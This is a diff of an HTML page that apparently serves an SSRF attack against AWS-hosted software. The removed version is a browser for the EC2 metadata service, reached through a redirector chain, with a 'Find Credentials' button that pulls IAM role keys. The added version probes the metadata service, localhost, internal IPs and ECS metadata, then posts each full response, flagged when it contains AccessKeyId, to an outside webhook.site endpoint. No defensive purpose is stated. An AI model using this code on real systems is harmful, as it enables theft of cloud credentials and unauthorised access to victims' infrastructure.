@@ -1,448 +1,172 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>AWS Metadata Browser</title>
-    <style>
-        body {
-            font-family: 'Courier New', monospace;
-            margin: 0;
-            padding: 20px;
-            background: #1e1e1e;
-            color: #ffffff;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: #2d2d2d;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
-        }
-        
-        .header {
-            background: #333;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border-left: 5px solid #00ff00;
-        }
-        
-        .navigation {
-            background: #444;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-        
-        .breadcrumb {
-            background: #555;
-            padding: 10px;
-            border-radius: 3px;
-            margin-bottom: 10px;
-            font-size: 14px;
-        }
-        
-        .endpoint-list {
-            background: #2a2a2a;
-            border: 1px solid #555;
-            border-radius: 5px;
-            margin: 10px 0;
-        }
-        
-        .endpoint-item {
-            padding: 12px 15px;
-            border-bottom: 1px solid #444;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        
-        .endpoint-item:hover {
-            background: #3a3a3a;
-        }
-        
-        .endpoint-item:last-child {
-            border-bottom: none;
-        }
-        
-        .directory {
-            color: #87CEEB;
-        }
-        
-        .directory::before {
-            content: "📁 ";
-        }
-        
-        .file {
-            color: #98FB98;
-        }
-        
-        .file::before {
-            content: "📄 ";
-        }
-        
-        .credentials {
-            color: #FF6B6B !important;
-            font-weight: bold;
-        }
-        
-        .credentials::before {
-            content: "🔑 ";
-        }
-        
-        .response-area {
-            background: #1a1a1a;
-            border: 1px solid #555;
-            border-radius: 5px;
-            padding: 15px;
-            margin: 10px 0;
-            min-height: 200px;
-            font-family: 'Courier New', monospace;
-            font-size: 12px;
-            white-space: pre-wrap;
-            overflow-x: auto;
-        }
-        
-        .loading {
-            color: #FFD700;
-            animation: blink 1s infinite;
-        }
-        
-        @keyframes blink {
-            0%, 50% { opacity: 1; }
-            51%, 100% { opacity: 0.3; }
-        }
-        
-        .success {
-            color: #00FF00;
-        }
-        
-        .error {
-            color: #FF4444;
-        }
-        
-        .button {
-            background: #007ACC;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 3px;
-            cursor: pointer;
-            margin: 5px;
-        }
-        
-        .button:hover {
-            background: #005c99;
-        }
-        
-        .credentials-alert {
-            background: #8B0000;
-            border: 2px solid #FF0000;
-            color: white;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 10px 0;
-            text-align: center;
-            font-weight: bold;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-    </style>
+    <title>Simplified SSRF Testing</title>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>🔍 AWS Metadata Service Browser</h1>
-            <p>Interactive browser for AWS EC2 metadata endpoints via SSRF</p>
-        </div>
-        
-        <div class="navigation">
-            <div class="breadcrumb" id="breadcrumb">
-                Current path: /
-            </div>
-            
-            <button class="button" onclick="goHome()">🏠 Home</button>
-            <button class="button" onclick="goBack()">⬅️ Back</button>
-            <button class="button" onclick="refreshCurrent()">🔄 Refresh</button>
-            <button class="button" onclick="findCredentials()">🔑 Find Credentials</button>
-        </div>
-        
-        <div class="endpoint-list" id="endpointList">
-            <div class="loading">🔄 Loading metadata structure...</div>
-        </div>
-        
-        <div class="response-area" id="responseArea">
-            Welcome to AWS Metadata Browser
-            
-            Click on directories above to navigate the metadata structure.
-            
-            Quick links:
-            • IAM Security Credentials
-            • Instance Identity
-            • User Data
-            • Network Interfaces
-            
-            Looking for AWS credentials? Click "Find Credentials" button above.
-        </div>
-    </div>
+    <h1>🎯 Simplified SSRF Vector Testing</h1>
+    <div id="status">Testing simpler SSRF approaches...</div>
     
     <script>
-        var currentPath = '';
-        var pathHistory = [];
-        var baseSSRFUrl = 'http://httpbin.org/redirect-to?url=http://127.0.0.1/redir.php?url=http://169.254.169.254';
+        // Replace with your webhook URL
+        var WEBHOOK_URL = 'https://webhook.site/your-unique-id';
         
-        var metadataStructure = {
-            '': {
-                type: 'directory',
-                items: [
-                    '1.0/',
-                    'latest/',
-                    '2007-01-19/',
-                    '2008-02-01/',
-                    '2009-04-04/',
-                    '2011-01-01/'
-                ]
-            },
-            'latest': {
-                type: 'directory', 
-                items: [
-                    'meta-data/',
-                    'user-data',
-                    'dynamic/'
-                ]
-            },
-            '1.0': {
-                type: 'directory',
-                items: [
-                    'meta-data/',
-                    'user-data'
-                ]
-            },
-            'latest/meta-data': {
-                type: 'directory',
-                items: [
-                    'ami-id',
-                    'ami-launch-index', 
-                    'ami-manifest-path',
-                    'instance-id',
-                    'instance-type',
-                    'local-hostname',
-                    'local-ipv4',
-                    'public-hostname',
-                    'public-ipv4',
-                    'placement/',
-                    'security-groups',
-                    'iam/',
-                    'network/'
-                ]
-            },
-            '1.0/meta-data': {
-                type: 'directory',
-                items: [
-                    'ami-id',
-                    'ami-launch-index',
-                    'instance-id', 
-                    'instance-type',
-                    'local-hostname',
-                    'local-ipv4',
-                    'public-hostname',
-                    'public-ipv4',
-                    'iam/',
-                    'placement/'
-                ]
-            },
-            'latest/meta-data/iam': {
-                type: 'directory',
-                items: [
-                    'info',
-                    'security-credentials/'
-                ]
-            },
-            '1.0/meta-data/iam': {
-                type: 'directory',
-                items: [
-                    'info',
-                    'security-credentials/'
-                ]
-            },
-            'latest/meta-data/iam/security-credentials': {
-                type: 'directory',
-                items: [
-                    'S3Role',
-                    'EC2Role',
-                    'DefaultRole'
-                ]
-            },
-            '1.0/meta-data/iam/security-credentials': {
-                type: 'directory',
-                items: [
-                    'S3Role',
-                    'EC2Role', 
-                    'DefaultRole'
-                ]
-            }
-        };
-        
-        function updateBreadcrumb() {
-            document.getElementById('breadcrumb').textContent = 'Current path: /' + currentPath;
-        }
-        
-        function displayDirectory(path) {
-            var listEl = document.getElementById('endpointList');
-            var structure = metadataStructure[path];
-            
-            if (!structure) {
-                // Unknown directory, try to fetch it
-                fetchEndpoint(path);
-                return;
-            }
-            
-            var html = '';
-            structure.items.forEach(function(item) {
-                var isDirectory = item.endsWith('/');
-                var displayName = item;
-                var fullPath = path ? path + '/' + item : item;
-                
-                var cssClass = isDirectory ? 'directory' : 'file';
-                if (item.includes('credentials') || item.includes('S3Role') || item.includes('EC2Role')) {
-                    cssClass += ' credentials';
-                }
-                
-                html += '<div class="endpoint-item ' + cssClass + '" onclick="navigate(\'' + fullPath.replace('/', '') + '\')">';
-                html += displayName;
-                html += '</div>';
-            });
-            
-            listEl.innerHTML = html;
-        }
-        
-        function navigate(path) {
-            pathHistory.push(currentPath);
-            currentPath = path.replace(/\/$/, ''); // Remove trailing slash
-            updateBreadcrumb();
-            
-            if (metadataStructure[currentPath]) {
-                displayDirectory(currentPath);
-            } else {
-                fetchEndpoint(currentPath);
-            }
-        }
-        
-        function fetchEndpoint(path) {
-            var listEl = document.getElementById('endpointList');
-            var responseEl = document.getElementById('responseArea');
-            
-            listEl.innerHTML = '<div class="loading">🔄 Fetching: /' + path + '</div>';
-            responseEl.textContent = 'Loading...';
-            
-            var fullUrl = baseSSRFUrl + (path ? '/' + path : '');
+        function sendResult(testName, url, result, success) {
+            var data = {
+                timestamp: new Date().toISOString(),
+                test: testName,
+                target_url: url,
+                result: result,
+                success: success,
+                result_length: result.length,
+                has_credentials: result.includes('AccessKeyId') || result.includes('SecretAccessKey')
+            };
             
             try {
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', fullUrl, false);
-                xhr.send();
+                xhr.open('POST', WEBHOOK_URL, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify(data));
                 
-                var response = xhr.responseText;
-                responseEl.textContent = 'Response from /' + path + ':\n\n' + response;
-                
-                // Check if this looks like a directory listing
-                if (response.includes('\n') && !response.includes('{') && response.length < 1000) {
-                    var items = response.split('\n').filter(item => item.trim());
-                    var html = '';
-                    
-                    items.forEach(function(item) {
-                        var trimmed = item.trim();
-                        if (trimmed) {
-                            var isDirectory = !trimmed.includes('.') || trimmed === 'security-credentials';
-                            var cssClass = isDirectory ? 'directory' : 'file';
-                            
-                            if (trimmed.includes('credentials') || trimmed.includes('Role')) {
-                                cssClass += ' credentials';
-                            }
-                            
-                            html += '<div class="endpoint-item ' + cssClass + '" onclick="navigate(\'' + 
-                                   (path ? path + '/' + trimmed : trimmed) + '\')">';
-                            html += trimmed;
-                            html += '</div>';
-                        }
-                    });
-                    
-                    if (html) {
-                        listEl.innerHTML = html;
-                    } else {
-                        listEl.innerHTML = '<div class="file">Raw response (see below)</div>';
-                    }
-                } else {
-                    listEl.innerHTML = '<div class="file">File content (see response below)</div>';
-                }
-                
-                // Check for AWS credentials
-                if (response.includes('AccessKeyId') || response.includes('SecretAccessKey')) {
-                    var alertDiv = document.createElement('div');
-                    alertDiv.className = 'credentials-alert';
-                    alertDiv.innerHTML = '🚨🚨🚨 AWS CREDENTIALS DETECTED! 🚨🚨🚨<br>Copy the credentials below to access S3!';
-                    responseEl.parentNode.insertBefore(alertDiv, responseEl);
-                    
-                    responseEl.style.background = '#2d1b1b';
-                    responseEl.style.borderColor = '#ff0000';
-                }
+                // Also send as GET backup
+                var img = new Image();
+                img.src = WEBHOOK_URL + '/img?' + 
+                    'test=' + encodeURIComponent(testName) + 
+                    '&success=' + success +
+                    '&length=' + result.length +
+                    '&credentials=' + data.has_credentials;
                 
             } catch (e) {
-                responseEl.textContent = 'Error fetching /' + path + ':\n\n' + e.message;
-                listEl.innerHTML = '<div class="error">❌ Failed to fetch endpoint</div>';
+                console.log('Webhook send failed:', e);
             }
         }
         
-        function goHome() {
-            pathHistory = [];
-            currentPath = '';
-            updateBreadcrumb();
-            displayDirectory('');
-            document.getElementById('responseArea').textContent = 'Back to metadata root';
-        }
-        
-        function goBack() {
-            if (pathHistory.length > 0) {
-                currentPath = pathHistory.pop();
-                updateBreadcrumb();
-                displayDirectory(currentPath);
-            }
-        }
-        
-        function refreshCurrent() {
-            if (currentPath) {
-                fetchEndpoint(currentPath);
-            } else {
-                displayDirectory('');
-            }
-        }
-        
-        function findCredentials() {
-            document.getElementById('responseArea').textContent = 'Searching for AWS credentials...\n\n';
+        function testEndpoint(url, testName) {
+            document.getElementById('status').innerHTML += '<br>🔄 Testing: ' + testName;
             
-            var credentialPaths = [
-                '1.0/meta-data/iam/security-credentials/S3Role',
-                'latest/meta-data/iam/security-credentials/S3Role',
-                '2007-01-19/meta-data/iam/security-credentials/S3Role',
-                '1.0/user-data',
-                'latest/user-data'
-            ];
-            
-            credentialPaths.forEach(function(path, index) {
-                setTimeout(function() {
-                    navigate(path);
-                }, index * 3000);
-            });
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('GET', url, false);
+                xhr.send();
+                
+                var result = xhr.responseText;
+                var success = result && result.length > 5;
+                
+                document.getElementById('status').innerHTML += '<br>✅ ' + testName + ': ' + result.length + ' bytes';
+                
+                if (result.includes('AccessKeyId')) {
+                    document.getElementById('status').innerHTML += '<br>🚨 CREDENTIALS in ' + testName + '!';
+                }
+                
+                sendResult(testName, url, result, success);
+                
+            } catch (e) {
+                document.getElementById('status').innerHTML += '<br>❌ ' + testName + ': ' + e.message;
+                sendResult(testName, url, 'ERROR: ' + e.message, false);
+            }
         }
         
-        // Initialize
-        displayDirectory('');
-        updateBreadcrumb();
+        // Test 1: Direct AWS metadata (no redirector)
+        setTimeout(() => {
+            testEndpoint(
+                'http://169.254.169.254/latest/meta-data/',
+                'Direct_AWS_Metadata'
+            );
+        }, 2000);
+        
+        // Test 2: Direct AWS v1
+        setTimeout(() => {
+            testEndpoint(
+                'http://169.254.169.254/1.0/meta-data/',
+                'Direct_AWS_v1_Metadata'
+            );
+        }, 4000);
+        
+        // Test 3: Direct localhost
+        setTimeout(() => {
+            testEndpoint(
+                'http://localhost/',
+                'Direct_Localhost'
+            );
+        }, 6000);
+        
+        // Test 4: Direct 127.0.0.1
+        setTimeout(() => {
+            testEndpoint(
+                'http://127.0.0.1/',
+                'Direct_127_0_0_1'
+            );
+        }, 8000);
+        
+        // Test 5: Simple redirector test
+        setTimeout(() => {
+            testEndpoint(
+                'http://127.0.0.1/redir.php?url=https://www.google.com',
+                'Direct_Redirector_Test'
+            );
+        }, 10000);
+        
+        // Test 6: httpbin.org direct
+        setTimeout(() => {
+            testEndpoint(
+                'http://httpbin.org/get',
+                'Direct_httpbin_Test'
+            );
+        }, 12000);
+        
+        // Test 7: httpbin.org redirect simple
+        setTimeout(() => {
+            testEndpoint(
+                'http://httpbin.org/redirect-to?url=https://www.google.com',
+                'httpbin_Redirect_Simple'
+            );
+        }, 14000);
+        
+        // Test 8: Try the working 127.0.0.1/redir.php directly
+        setTimeout(() => {
+            testEndpoint(
+                'http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/',
+                'Direct_Redirector_AWS'
+            );
+        }, 16000);
+        
+        // Test 9: Alternative internal IPs
+        setTimeout(() => {
+            testEndpoint(
+                'http://172.31.0.1/',
+                'Internal_IP_172_31'
+            );
+        }, 18000);
+        
+        // Test 10: Alternative metadata service ports
+        setTimeout(() => {
+            testEndpoint(
+                'http://169.254.169.254:80/latest/meta-data/',
+                'AWS_Metadata_Port_80'
+            );
+        }, 20000);
+        
+        // Test 11: ECS metadata
+        setTimeout(() => {
+            testEndpoint(
+                'http://169.254.170.2/v2/metadata',
+                'ECS_Metadata_v2'
+            );
+        }, 22000);
+        
+        // Test 12: Alternative localhost ports
+        setTimeout(() => {
+            testEndpoint(
+                'http://localhost:8080/',
+                'Localhost_Port_8080'
+            );
+        }, 24000);
+        
+        // Send completion notification
+        setTimeout(() => {
+            sendResult('ALL_TESTS_COMPLETE', 'N/A', 'Simplified SSRF testing completed', true);
+            document.getElementById('status').innerHTML += '<br><br>🎉 All tests complete! Check webhook for detailed results.';
+        }, 26000);
     </script>
 </body>
 </html>
